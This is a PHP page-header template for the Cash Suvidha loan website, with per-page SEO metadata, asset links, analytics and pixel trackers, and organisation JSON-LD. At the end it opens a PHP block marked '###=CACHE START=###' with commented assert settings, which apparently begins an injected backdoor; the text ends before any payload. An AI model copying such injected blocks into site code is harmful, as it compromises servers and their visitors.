<?php function curPageName() { return substr($_SERVER["SCRIPT_NAME"],strrpos($_SERVER["SCRIPT_NAME"],"/")+1); } $page  = curPageName(); ?>

<?php
if($_SERVER['HTTP_HOST']=="localhost")
{    
$basrURL='https://localhost/cash_suvidha/';
}
else
{    
$basrURL ='https://'.$_SERVER['HTTP_HOST'].'/';
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
<!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-KN4ZSK6');</script>
<!-- End Google Tag Manager -->
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>
<?php if ($page == 'index.php') { ?>
Business Loans for SMEs in Delhi, India | Cash Suvidha
<?php } elseif($page == 'about.php') { ?>
Small Business Loans in India | Finance Company Delhi - NBFC
<?php } elseif($page == 'advisory-team.php') { ?>
Advisory Team – Cash Suvidha | Best Financial Advisors in India
<?php } elseif($page == 'contact.php') { ?>
Contact | Cash Suvidha - www.cashsuvidha.com
<?php } elseif($page == 'core-team.php') { ?>
Team - Cash Suvidha | Core Team
<?php } elseif($page == 'entrepreneur-loan.php') { ?>
Business Loans for Entrepreneurs | Small Business Finance for Entrepreneurs
<?php } elseif($page == 'fair-practice.php') { ?>
Fair Practice Code - Cash Suvidha
<?php } elseif($page == 'faq.php') { ?>
FAQ – Frequently Asked Questions | Cash Suvidha
<?php } elseif($page == 'how-we-work.php') { ?>
Suvidha Score for Loan | Finance Service in India | Apply Small Business Loan
<?php } elseif($page == 'invoice-finance.php') { ?>
Invoice Finance Service | Invoice Financing for Small Business | Cash Suvidha
<?php } elseif($page == 'personal-loan.php') { ?>
Personal Loan in India | Apply Online for Personal Loans | Cash Suvidha
<?php } elseif($page == 'login.php') { ?>
User Login | Cash Suvidha
<?php } elseif($page == 'thank-you.php') { ?>
Thanks for Connecting Us | Cash Suvidha
<?php } elseif($page == 'privacy.php') { ?>
Privacy Policies | Cash Suvidha
<?php } elseif($page == 'product.php') { ?>
SME Business Loans | Loan Facility for Women’s | Entrepreneur Loan Services
<?php } elseif($page == 'sme-loan.php') { ?>
Small Business Loan for SMEs | SME Loan Service in India | Cash Suvidha
<?php } elseif($page == 'terms-conditions.php') { ?>
Terms Conditions | Cash Suvidha
<?php } elseif($page == 'women-loan.php') { ?>
Loan Service for Women | Small Business Loans for Women
<?php } elseif($page == 'mr-rajesh-gupta.php') { ?>
Mr. Rajesh Gupta | Founder - Cash Suvidha
<?php } elseif($page == 'mr-anoop-garg.php') { ?>
Mr. Anoop Garg | Co-Founder - Cash Suvidha
<?php } elseif($page == 'ms-geeta-goswami.php') { ?>
Ms. Geeta Goswami | Company Secretary - Cash Suvidha
<?php } elseif($page == 'mr-santosh-kumar-singh.php') { ?>
Mr. Santosh Kumar Singh | Micro & Small Financing Operational Head - Cash Suvidha
<?php } elseif($page == 'mr-vipin-aggarwal.php') { ?>
Mr. vipin aggarwal | Advisory - Cash Suvidha
<?php } elseif($page == 'mr-baljinder-sharma.php') { ?>
Mr. Baljinder Sharma | Advisory - Cash Suvidha
<?php } elseif($page == '404.php') { ?>
Page Not Found | 404 Error
<?php } elseif($page == 'careers.php') { ?>
Career | Jobs Opportunities for your Career Growth | Cash Suvidha
<?php } elseif($page == 'shaksham-shakti-login.php') { ?>
Shaksham Shakti Member Login | Cash Suvidha
<?php } elseif($page == 'mr-amit-sharma.php') { ?>
Amit Sharma - Digital Marketing Expert | Cash Suvidha
<?php } elseif($page == 'ms-priya-yadav.php') { ?>
Ms. Priya Yadav - Business Development | Cash Suvidha
<?php } elseif($page == 'mr-kapil-garg.php') { ?>
Mr. Kapil Garg - Account & Finance | Cash Suvidha
<?php } elseif($page == 'mr-amit.php') { ?>
Mr. Amit Sharma - Head Marketing & Strategic Alliances | Cash Suvidha
<?php } elseif($page == 'mr-pranay-dhondiyal.php') { ?>
Mr. Pranay Dhondiyal - Operations | Cash Suvidha
<?php } elseif($page == 'mrs-anuradha-walia-sondhi.php') { ?>
Mrs. Anuradha Walia Sondhi | Advisory Team Member - Cash Suvidha
<?php } elseif($page == 'news-and-events.php') { ?>
News & Events - Cash Suvidha | Media Coverage of Cash Suvidha
<?php } elseif($page == 'iso-9001-2015-certified.php') { ?>
ISO 9001:2015 CERTIFICATE - Cash Suvidha | ISO 9001 Certified
<?php } elseif($page == 'tarun-saxena.php') { ?>
Mr. Tarun Saxena | Senior PHP Developer - Cash Suvidha
<?php } elseif($page == 'viraj-gupta.php') { ?>
Mr. Viraj Gupta | Head of Recovery at Cash Suvidha
<?php } elseif($page == 'privacy-policy.php') { ?>
Privacy Policies | Cash Suvidha
<?php } elseif($page == 'manishnama.php') { ?>
Mr. Manish Nama | Senior Credit Manager at Cash Suvidha
<?php } elseif($page == 'cibil-report-conditions.php') { ?>
Check Cibil Report | Terms & Conditions | Cash Suvidha
<?php } elseif($page == 'review.php') { ?>
Write Your Review | Cash Suvidha
<?php } ?>
</title>
<meta name="description" content="
<?php if ($page == 'index.php') { ?>
Cash Suvidha is an emerging online fintech platform in India that works for customer requirement and offer business loan or funding services within 3 days.
<?php } elseif($page == 'about.php') { ?>
Cash Suvidha is the trade name of Usha Financial Services Pvt. Ltd. that serve fast, transparent and smooth application process for customers that’s are interested in loan service.
<?php } elseif($page == 'advisory-team.php') { ?>
Cash Suvidha have a group of business management professionals who can easily maintain business planning, marketing strategies and workshops for emerging businesses.
<?php } elseif($page == 'contact.php') { ?>
Contact with us for any query or information, mail us on info@cashsuvidha.com, call us on 8800198454 and visit our website www.cashsuvidha.com.
<?php } elseif($page == 'core-team.php') { ?>
We have well experienced qualified team that can easily handle all the queries of our customer and provide high quality service with work efficiency.
<?php } elseif($page == 'entrepreneur-loan.php') { ?>
Cash Suvidha offers attractive lending schemes to trained, qualified and deserving entrepreneurs for creating or growing his business opportunities in industrial market.
<?php } elseif($page == 'fair-practice.php') { ?>
Cash Suvidha provides fair practice code, here we have mention all guidelines according to RBI rules that are followed by finance companies with its customers.
<?php } elseif($page == 'faq.php') { ?>
Get answers for the most frequently asked questions (FAQs) regarding SME Loan, women loans, business loans, entrepreneur loan and much more.
<?php } elseif($page == 'how-we-work.php') { ?>
Cash Suvidha work on user friendly environment and provide simple or quick application process that in very easy to understand so you can apply for loan just following some simple steps.
<?php } elseif($page == 'invoice-finance.php') { ?>
Cash Suvidha offers Invoice Finance Service to improve your businesses cash flow and changed your invoices into money that can manage all yours payment commitments.
<?php } elseif($page == 'personal-loan.php') { ?>
Get Personal Loan in India at Lowest Interest Rates with Instant Approvals and Fast Disbursal by following simple & quick online application process of Cash Suvidha.
<?php } elseif($page == 'login.php') { ?>
User Login - Cash Suvidha
<?php } elseif($page == 'thank-you.php') { ?>
Thanks for Connecting with Cash Suvidha, we will get back you soon.
<?php } elseif($page == 'privacy.php') { ?>
Here, Cash Suvidha provides privacy policies in written format for all clients regarding our services, so please read all our privacy policies carefully.
<?php } elseif($page == 'product.php') { ?>
Cash Suvidha comes with various loan facilities that help to improve your personal or business growth and also launch special financing facilities for women’s.
<?php } elseif($page == 'sme-loan.php') { ?>
Cash Suvidha is an online finance service platform that offers loan services for small and medium-sized enterprises (SMEs) to improve their skills, scopes in business area.
<?php } elseif($page == 'terms-conditions.php') { ?>
Please check all terms and conditions carefully that are provide by Cash Suvidha for all coustomers.
<?php } elseif($page == 'women-loan.php') { ?>
Cash Suvidha is an online lending platform that can developed for economic empowerment of women’s by providing business loan facilities to all women entrepreneurs.
<?php } elseif($page == 'mr-rajesh-gupta.php') { ?>
Mr. Rajesh Gupta is the Founder of Cash Suvidha and highly experienced in the Business & Financial Market.
<?php } elseif($page == 'mr-anoop-garg.php') { ?>
Mr. Anoop Garg is the Co-Founder of Cash Suvidha, well experienced in RealEstate and Financial Market. He has been institutional in the growth story of the company.
<?php } elseif($page == 'ms-geeta-goswami.php') { ?>
Geeta Goswami working as an Company Secretary of Cash Suvidha, has 10 Years of experience in business Development, Legal & Secretarial consultancy 
<?php } elseif($page == 'mr-vipin-aggarwal.php') { ?>
Mr. vipin aggarwal is advisory team member of Cash Suvidha
<?php } elseif($page == 'mr-baljinder-sharma.php') { ?>
Mr. Baljinder Sharma is advisory team member of Cash Suvidha
<?php } elseif($page == '404.php') { ?>
This page can not found on server, kindly check url or going to website manu navigation to select correct page.
<?php } elseif($page == 'careers.php') { ?>
Learn more about careers and job opportunities to make a change in your career. See current openings in CashSuvidha.com.
<?php } elseif($page == 'mr-amit-sharma.php') { ?>
Amit Sharma, work as Digital Marketing Expert in Cash Suvidha, have more than 5 years of experience in this field.
<?php } elseif($page == 'ms-priya-yadav.php') { ?>
Ms. Priya Yadav, work as Business Development Executive in Cash Suvidha, Her professional journey has completed a span of 5 years in same field.
<?php } elseif($page == 'mr-kapil-garg.php') { ?>
Mr. Kapil Garg, work as Senior Account & Finance Executive in Cash Suvidha, Having over 18 years of experience in Accounts & Taxation (Indirect).
<?php } elseif($page == 'mr-pranay-dhondiyal.php') { ?>
Mr. Pranay Dhondiyal as Operations Manager in Cash Suvidha, Having over 7 years of experience. He is having a B.Com degree along with PGDM in Software Application.
<?php } elseif($page == 'mrs-anuradha-walia-sondhi.php') { ?>
Mrs. Anuradha Walia Sondhi is advisory team member in Cash Suvidha, Business Analyst with experience in finance, mortgage and IT sectors with hands on experience in project planning and Coordination.
<?php } elseif($page == 'news-and-events.php') { ?>
Cash Suvidha has been covered by different media platforms like.. Aaj Tak, ABP Live, Business Standard, Economic Times, India Times, VCCircle, Your Story, Inc42, Yahoo News, Business Today, faad, BWDiSRUPT, Startups Talk, TechINASIA, etc.
<?php } elseif($page == 'iso-9001-2015-certified.php') { ?>
Cash Suvidha, M/S Usha Financial Services Private Limited, believes in quality and hence gone for once of the best certification in industry i.e. ISO 9001:2015 in QUALITY MANAGEMENT SYSTEM.
<?php } elseif($page == 'tarun-saxena.php') { ?>
Mr. Tarun Saxena, Senior PHP Developer in Cash Suvidh, having 5 Year of experience in web development (php).
<?php } elseif($page == 'viraj-gupta.php') { ?>
Mr. Viraj Gupta, working as Head of Recovery in Cash Suvidha, having 18 Years of experience in operations and debt recovery.
<?php } elseif($page == 'manishnama.php') { ?>
Mr. Manish Nama is Senior Credit Manager at Cash Suvidha having 7 years of experience in underwriting of Business Loans, Loan against property, Housing Loans.
<?php } ?>
">
<meta name="keywords" content="
<?php if ($page == 'index.php') { ?>
cash suvidha, finance service, business loan, business loans, business loan in India, business loans for sme, apply online for business loan, online fintech platform, fast loan service provider, invoice finance, Business Loan in Delhi, women loans, business loans for women, small business loans for women, small business loans in India, 100000 loan, 2 lac rupee loan, loan for sme, quick business loan, fast business loan, hassle free business loan, collateral free business loan, business loans without collateral, unsecured business loans, business loan eligibility
<?php } elseif($page == 'about.php') { ?>
cash suvidha, finance service, sme loan service, loan for individual, women loans, Business Loans for SME, business loans, business loans for women, small business loans, small business loans for women, business loans women, small business loans in india.
<?php } elseif($page == 'advisory-team.php') { ?>
cash suvidha team, advisory team, venture capital, angel investor, seed capital, finance service in india, sme loan service, invoice finance service, loan for individual, women loans, business loans, business loans for women.
<?php } elseif($page == 'contact.php') { ?>
Cash suvidha, contact us, info@cashsuvidha.com, financial services, sme loan, loan for individual, women loans, business loans for sme, business loans, business loans for women, business loans, small business loans for women, small business loans in India.
<?php } elseif($page == 'core-team.php') { ?>
cash suvidh team, finance service in india, experienced finance team, sme loan service, invoice finance service, loan for individual, women loans, business loans, business loans for women, secured business loans.
<?php } elseif($page == 'entrepreneur-loan.php') { ?>
cash suvidha, entrepreneurs loan, finance service in India, sme loan service, small medium enterprises loan service, loan for women enterprises, business loans, business loans for women, small business loans for women.
<?php } elseif($page == 'personal-loan.php') { ?>
personal loan, personal loans, apply for personal loan, apply online for personal loan, personal loan interest rates, compare personal loans, personal loan eligibility, get personal loan, personal loans in delhi ncr, personal loan India
<?php } elseif($page == 'fair-practice.php') { ?>
cash suvidha, fair practice, finance service, sme loan service, loan for individual, women loans, Business Loans for SME, business loans, business loans for women, small business start-up loans, business loans women, small business loans in India.
<?php } elseif($page == 'faq.php') { ?>
cash suvidha, faq, entrepreneurs loan, finance service in india, sme loan service, small medium enterprises loan service, loan for women enterprises, business loans, business loans for women, small business loans for women.
<?php } elseif($page == 'how-we-work.php') { ?>
cash suvidha, finance service provider in India, get suvidha score, sme loan service, loan for individual, women loans, business loans, business loans for women, secured business loans, small business loans for women, loans to small businesses.
<?php } elseif($page == 'invoice-finance.php') { ?>
cash suvidha, invoice finance, finance service in india, invoice financing for sme, small medium enterprises loan service, loan for women enterprises, business loans, business loans for women, invoice finance for business.
<?php } elseif($page == 'login.php') { ?>
User Login - Cash Suvidha
<?php } elseif($page == 'thank-you.php') { ?>
cash suvidha, thank you, thanks for your query, apply online for business loan, apply online for loan, small business loan in delhi, loan for women in delhi, business loans for women, msme loan.
<?php } elseif($page == 'privacy.php') { ?>
cash suvidha, privacy policies, finance service, sme loan service, loan for individual, women loans, Business Loans for SME, secured business loans, small business loans for women, easy business loan, loans to small businesses, business loans women, small business loans in India.
<?php } elseif($page == 'product.php') { ?>
Finance service in India, business loan, sme loan service, invoice finance service, loan for individual, women loans, business loans, business loans for women, secured business loans, small business loans for women, loans to small businesses, entrepreneur loan
<?php } elseif($page == 'sme-loan.php') { ?>.
cash suvidha, sme loans, finance service for sme, sme loan service india, small medium enterprises loan service, loan for women enterprises, business loans, business loans for women, small business loans for women.
<?php } elseif($page == 'terms-conditions.php') { ?>
cash suvidha, terms conditions, financial services, sme loan, loan for individual, women loans, business loans for sme, business loans, business loans for women, business loan, small business loans for women.
<?php } elseif($page == 'women-loan.php') { ?>
cash suvidha, loan for women, finance service in India, sme loan service, small medium enterprises loan for women, loan for women enterprises, business loans for women, business loans for women, small business loans for women.
<?php } elseif($page == 'mr-rajesh-gupta.php') { ?>
Mr. Rajesh Gupta, Founder, Cash Suvidha
<?php } elseif($page == 'mr-anoop-garg.php') { ?>
Mr. Anoop Garg, Co-Founder, Cash Suvidha
<?php } elseif($page == 'ms-geeta-goswami.php') { ?>
Ms. Geeta Goswami, Company Secretary, Cash Suvidha
<?php } elseif($page == 'mr-vipin-aggarwal.php') { ?>
Mr. vipin aggarwal, Advisory, Cash Suvidha
<?php } elseif($page == 'mr-baljinder-sharma.php') { ?>
Mr. Baljinder Sharma, Advisory, Cash Suvidha
<?php } elseif($page == '404.php') { ?>
Page Not Found, 404 Error Page, 404 Page
<?php } elseif($page == 'careers.php') { ?>
cash suvidha, new jobs, current opening, jobs in delhi/ncr, jobs in India, job opportunities, current job openings.
<?php } elseif($page == 'mr-amit-sharma.php') { ?>
Amit Sharma, Digital Marketing Expert, Cash Suvidha, Team Cash Suvidha
<?php } elseif($page == 'ms-priya-yadav.php') { ?>
Ms. Priya Yadav, Business Development Executive, Cash Suvidha, Team Cash Suvidha
<?php } elseif($page == 'mr-kapil-garg.php') { ?>
Mr. Kapil Garg, Account & Finance, Cash Suvidha, Team Cash Suvidha
<?php } elseif($page == 'mr-pranay-dhondiyal.php') { ?>
Pranay Dhondiyal, Operations, Cash Suvidha, Team Cash Suvidha
<?php } elseif($page == 'mrs-anuradha-walia-sondhi.php') { ?>
Mrs. Anuradha Walia Sondhi, Strategic Planning, Market Research, New Setups, Financial Planning, Sales & Marketing, Distribution Management, Business Process Champion, Training & Development.
<?php } elseif($page == 'news-and-events.php') { ?>
Cash Suvidha, News & Events, Media Coverage, faad, BWDiSRUPT, Startups Talk, TechINASIA
<?php } elseif($page == 'iso-9001-2015-certified.php') { ?>
cash suvidha, ISO 9001:2015 CERTIFICATE, ISO 9001 Certified, Trusted Company, finance service in India, Business Loan Service in Delhi/NCR, Loan for SMEs.
<?php } elseif($page == 'tarun-saxena.php') { ?>
tarun Saxena, Senior PHP Developer, Cash Suvidha
<?php } elseif($page == 'viraj-gupta.php') { ?>
Mr. Viraj Gupta, Head of Recovery, operations, debt recovery, team Cash Suvidha
<?php } elseif($page == 'manishnama.php') { ?>
Manish Nama, Senior Credit Manager, Cash Suvidha, Business Loans, Loan against property, Housing Loans, personal loan, credit manager.
<?php } ?>
">
<meta name="robots" content="
<?php if ($page == 'index.php') { ?>
index, follow
<?php } elseif($page == 'about.php') { ?>
index, follow
<?php } elseif($page == 'advisory-team.php') { ?>
index, follow
<?php } elseif($page == 'contact.php') { ?>
index, follow
<?php } elseif($page == 'core-team.php') { ?>
index, follow
<?php } elseif($page == 'entrepreneur-loan.php') { ?>
index, follow
<?php } elseif($page == 'personal-loan.php') { ?>
index, follow
<?php } elseif($page == 'fair-practice.php') { ?>
noindex, follow
<?php } elseif($page == 'faq.php') { ?>
index, follow
<?php } elseif($page == 'how-we-work.php') { ?>
index, follow
<?php } elseif($page == 'invoice-finance.php') { ?>
index, follow
<?php } elseif($page == 'login.php') { ?>
noindex, follow
<?php } elseif($page == 'thank-you.php') { ?>
index, follow
<?php } elseif($page == 'privacy.php') { ?>
noindex, follow
<?php } elseif($page == 'product.php') { ?>
index, follow
<?php } elseif($page == 'sme-loan.php') { ?>
index, follow
<?php } elseif($page == 'terms-conditions.php') { ?>
noindex, follow
<?php } elseif($page == 'women-loan.php') { ?>
index, follow
<?php } elseif($page == 'mr-rajesh-gupta.php') { ?>
index, follow
<?php } elseif($page == 'mr-anoop-garg.php') { ?>
index, follow
<?php } elseif($page == 'ms-geeta-goswami.php') { ?>
index, follow
<?php } elseif($page == 'mr-vipin-aggarwal.php') { ?>
index, follow
<?php } elseif($page == 'mr-baljinder-sharma.php') { ?>
index, follow
<?php } elseif($page == '404.php') { ?>
index, follow
<?php } elseif($page == 'careers.php') { ?>
index, follow
<?php } elseif($page == 'mr-amit-sharma.php') { ?>
index, follow
<?php } elseif($page == 'ms-priya-yadav.php') { ?>
index, follow
<?php } elseif($page == 'mr-kapil-garg.php') { ?>
index, follow
<?php } elseif($page == 'mr-pranay-dhondiyal.php') { ?>
index, follow
<?php } elseif($page == 'news-and-events.php') { ?>
index, follow
<?php } elseif($page == 'iso-9001-2015-certified.php') { ?>
index, follow
<?php } elseif($page == 'tarun-saxena.php') { ?>
index, follow
<?php } elseif($page == 'viraj-gupta.php') { ?>
index, follow
<?php } elseif($page == 'manishnama.php') { ?>
index, follow
<?php } ?>
">
<meta property="og:type" content="website">
<meta name="og_site_name" property="og:site_name" content="Cash Suvidha"/>
<meta name="og_url" property="og:url" content="https://www.cashsuvidha.com"/>
<meta property="og:image" content="https://www.cashsuvidha.com/assets/images/cash-suvidha-logo.jpg" />
<meta name="language" content="English" />
<meta name="Copyright" content="https://www.cashsuvidha.com" />
<meta property="twitter:card" content="summary_large_image" />
<meta property="twitter:site" content="@CashSuvidha" />
<meta name="twitter:creator" content="@CashSuvidha">
<meta property="twitter:title" content="Business Loans for SMEs in Delhi, India | Cash Suvidha" />
<meta property="twitter:description" content="Cash Suvidha is an emerging online fintech platform in India that works for customer requirement and offer business loan or funding services within 3 days." />
<meta name="twitter:url" content="https://www.cashsuvidha.com/" />
<meta name="twitter:image" content="https://www.cashsuvidha.com/assets/images/cash-suvidha-logo.jpg">
<link rel="publisher" href="https://plus.google.com/103963904305799486558" />
<link rel="canonical" href="
<?php if ($page == 'index.php') { ?>
https://www.cashsuvidha.com/
<?php } elseif($page == 'about.php') { ?>
https://www.cashsuvidha.com/about.php
<?php } elseif($page == 'advisory-team.php') { ?>
https://www.cashsuvidha.com/advisory-team.php
<?php } elseif($page == 'contact.php') { ?>
https://www.cashsuvidha.com/contact.php
<?php } elseif($page == 'core-team.php') { ?>
https://www.cashsuvidha.com/core-team.php
<?php } elseif($page == 'entrepreneur-loan.php') { ?>
https://www.cashsuvidha.com/entrepreneur-loan.php
<?php } elseif($page == 'personal-loan.php') { ?>
https://www.cashsuvidha.com/personal-loan.php
<?php } elseif($page == 'fair-practice.php') { ?>
https://www.cashsuvidha.com/fair-practice.php
<?php } elseif($page == 'faq.php') { ?>
https://www.cashsuvidha.com/faq.php
<?php } elseif($page == 'how-we-work.php') { ?>
https://www.cashsuvidha.com/how-we-work.php
<?php } elseif($page == 'invoice-finance.php') { ?>
https://www.cashsuvidha.com/invoice-finance.php
<?php } elseif($page == 'login.php') { ?>
https://www.cashsuvidha.com/login.php
<?php } elseif($page == 'thank-you.php') { ?>
https://www.cashsuvidha.com/thank-you.php
<?php } elseif($page == 'privacy.php') { ?>
https://www.cashsuvidha.com/privacy.php
<?php } elseif($page == 'product.php') { ?>
https://www.cashsuvidha.com/product.php
<?php } elseif($page == 'sme-loan.php') { ?>
https://www.cashsuvidha.com/sme-loan.php
<?php } elseif($page == 'terms-conditions.php') { ?>
https://www.cashsuvidha.com/terms-conditions.php
<?php } elseif($page == 'women-loan.php') { ?>
https://www.cashsuvidha.com/women-loan.php
<?php } elseif($page == 'mr-rajesh-gupta.php') { ?>
https://www.cashsuvidha.com/mr-rajesh-gupta.php
<?php } elseif($page == 'mr-anoop-garg.php') { ?>
https://www.cashsuvidha.com/mr-anoop-garg.php
<?php } elseif($page == 'ms-geeta-goswami.php') { ?>
https://www.cashsuvidha.com/ms-geeta-goswami.php
<?php } elseif($page == 'mr-vipin-aggarwal.php') { ?>
https://www.cashsuvidha.com/mr-vipin-aggarwal.php
<?php } elseif($page == 'mr-baljinder-sharma.php') { ?>
https://www.cashsuvidha.com/mr-baljinder-sharma.php
<?php } elseif($page == 'careers.php') { ?>
https://www.cashsuvidha.com/careers.php
<?php } elseif($page == 'mr-amit-sharma.php') { ?>
https://www.cashsuvidha.com/mr-amit-sharma.php
<?php } elseif($page == 'ms-priya-yadav.php') { ?>
https://www.cashsuvidha.com/ms-priya-yadav.php
<?php } elseif($page == 'mr-kapil-garg.php') { ?>
https://www.cashsuvidha.com/mr-kapil-garg.php
<?php } elseif($page == 'mr-pranay-dhondiyal.php') { ?>
https://www.cashsuvidha.com/mr-pranay-dhondiyal.php
<?php } elseif($page == 'news-and-events.php') { ?>
https://www.cashsuvidha.com/news-and-events.php
<?php } elseif($page == 'iso-9001-2015-certified.php') { ?>
https://www.cashsuvidha.com/iso-9001-2015-certified.php
<?php } elseif($page == '404.php') { ?>
https://www.cashsuvidha.com/
<?php } elseif($page == 'tarun-saxena.php') { ?>
https://www.cashsuvidha.com/tarun-saxena.php
<?php } elseif($page == 'viraj-gupta.php') { ?>
https://www.cashsuvidha.com/viraj-gupta.php
<?php } elseif($page == 'manishnama.php') { ?>
https://www.cashsuvidha.com/manishnama.php
<?php } ?> ">
<meta name="p:domain_verify" content="bdde14d23541f41c01e693a4196ab12f"/>
<link href="<?=$basrURL?>assets/css/asr-howitworks.min.css" rel="stylesheet">
<link href="<?=$basrURL?>assets/css/asr-index.css" rel="stylesheet">
<link href="<?=$basrURL?>assets/css/asr-index.min.css" rel="stylesheet">

<!-- Loading Bootstrap -->
<link href="<?=$basrURL?>assets/css/bootstrap.css" rel="stylesheet">
<link href="<?=$basrURL?>assets/css/style.css" rel="stylesheet">
<link href="<?=$basrURL?>assets/css/style-magnific-popup.css" rel="stylesheet">

<!-- Loading Layer Slider -->
<link href="<?=$basrURL?>assets/css/layerslider.css" rel="stylesheet">

<!--Loading Feedback sticky Enquiry form -->
<link href="assets/css/feedback.css" rel="stylesheet"/>

<!-- Font Awesome -->
<link href="<?=$basrURL?>assets/css/font-awesome.css" rel="stylesheet">

<!-- this Script is Using for star Section -->
<link href="<?=$basrURL?>assets/css/star_style.css" rel="stylesheet">

<!-- Google Fonts -->
<link href="https://fonts.googleapis.com/css?family=Lato:100,300,400,700,300italic,400italic" rel="stylesheet" type="text/css">
<link href="https://fonts.googleapis.com/css?family=Pacifico" rel="stylesheet" type="text/css">
<link rel="shortcut icon" href="<?=$basrURL?>assets/images/favicon.png">

<!-- HTML5 shim, for IE6-8 support of HTML5 elements. All other JS at the end of file. -->

<!-- Feedback Javascript -->
<script type='text/javascript' src="assets/js/feedback.js"></script>

<!--headerIncludes-->
<link rel="stylesheet" href="<?=$basrURL?>assets/css/owl.carousel.css">
<script type='text/javascript' src='<?=$basrURL?>assets/js/jquery.min.js'></script>
<script src='<?=$basrURL?>assets/js/bootbox.js'></script>
<link rel="stylesheet" href="<?=$basrURL?>assets/css/validationEngine.jquery.css" />

<script type='text/javascript' src="<?=$basrURL?>assets/js/extra/common.js"></script>
<script type='text/javascript' src="<?=$basrURL?>assets/js/extra/jquery-1.9.0.min.js"></script>
<script type='text/javascript' src="<?=$basrURL?>assets/js/extra/validation_reg.js"></script>
<link rel="stylesheet" type="text/css" href="<?=$basrURL?>assets/css/common.css" />

<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-81488627-1', 'auto');
  ga('send', 'pageview');

</script>


<!-- Facebook Pixel Code -->
<script>
!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,
document,'script','https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '1733444496944234');
fbq('track', 'PageView');
</script>
<noscript><img height="1" width="1" style="display:none"
src="https://www.facebook.com/tr?id=1733444496944234&ev=PageView&noscript=1"
/></noscript>
<!-- DO NOT MODIFY -->
<!-- End Facebook Pixel Code -->

<style>
body{ overflow-x:hidden !important;}
.text_white{ color:#fff !important;}
.f-13{ font-size:13px !important;}
</style>
<script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Organization",
  "url": "https://www.cashsuvidha.com",
  "logo": "https://www.cashsuvidha.com/assets/images/cash-suvidha.png",
  "contactPoint": [{
    "@type": "ContactPoint",
    "telephone": "+91-1800-120-4847",
    "contactType": "customer service"
  }]
}
</script>
<script type='application/ld+json'>
        {
            "@context": "http://www.schema.org",
            "@type": "Organization",
            "name": "CashSuvidha",
            "url": "https://www.cashsuvidha.com/",
            "logo": "https://www.cashsuvidha.com/assets/images/cash-suvidha.png",
            "description": "Cash Suvidha is an emerging online fintech platform in India that works for customer requirement and offer business loan or funding services within 3 days.",
            "address": {
                "@type": "PostalAddress",
                "streetAddress": "117, Second Floor, Ram Vihar",
                "addressLocality": "New Delhi",
                "addressRegion": "New Delhi",
                "postalCode": "110092",
                "addressCountry": "India",
                "email": "info@cashsuvidha.com",
                "telephone": "011-49576046"
            },
            "foundingLocation": {
                "@type": "place",
                "geo": {
                    "@type": "GeoCoordinates",
                    "latitude": "28.659886",
                    "longitude": "77.307784"
                },
                "hasMap": "https://www.google.co.in/maps/place/Cash+Suvidha+-+Business+Loan+in+Delhi+NCR/@28.659743,77.3057823,17z/data=!3m1!4b1!4m5!3m4!1s0x390cfb6b69cc5cab:0xd8a4443d6356f641!8m2!3d28.659743!4d77.307971"
            },
            "sameAs": [
    "https://www.facebook.com/CashSuvidha",
    "https://twitter.com/CashSuvidha",
    "https://www.instagram.com/cashsuvidha",
    "https://www.linkedin.com/company/cash-suvidha",
    "https://plus.google.com/+Cashsuvidha",
    "https://in.pinterest.com/cashsuvidha",
    "https://www.youtube.com/c/Cashsuvidha"
                
            ]
        }
</script>
<script type="application/ld+json">
{
  "@context": "http://schema.org/",
  "@type": "Review",
  "itemReviewed": {
    "@type": "Thing",
    "name": "Cash Suvidha"
  },
  "author": {
    "@type": "Person",
    "name": "Amit Sharma"
  },
  "reviewRating": {
    "@type": "Rating",
    "ratingValue": "8",
    "bestRating": "10"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Cash Suvidha"
  }
}
</script>
<style>
.min-90 {
	line-height: 24px;
	min-height:40px !important;
}
.howits_info p {
    font-size: 14px;
    line-height: 18px;
    font-weight: 300;
    margin-bottom: 10px !important;
    color: #ebf8fc;
}

</style>
</head>
<?php 
//###=CACHE START=###
//error_reporting(0);
//assert_options(ASSERT_ACTIVE, 1);
//assert_options(ASSERT_WARNING, 0);
